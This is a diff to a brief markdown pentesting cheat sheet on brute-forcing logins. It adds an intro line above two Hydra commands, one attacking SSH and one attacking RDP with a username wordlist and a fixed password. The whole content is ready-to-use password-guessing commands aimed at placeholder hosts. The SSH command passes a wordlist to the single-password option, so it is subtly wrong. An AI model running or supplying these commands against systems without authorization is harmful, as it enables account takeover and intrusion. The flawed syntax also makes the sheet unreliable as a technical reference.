@@ -1,5 +1,5 @@
 # Bruteforce
-
+Hera are some basic ways to do it. 
 ## Hydra
 * SSH: sudo hydra -l user -p /path/of/wordlist.txt -s PORT ssh://IP
 * RDP: sudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://IP -> Bruteforce usernames it'll depends about logic if you need the password then put there the wordlist
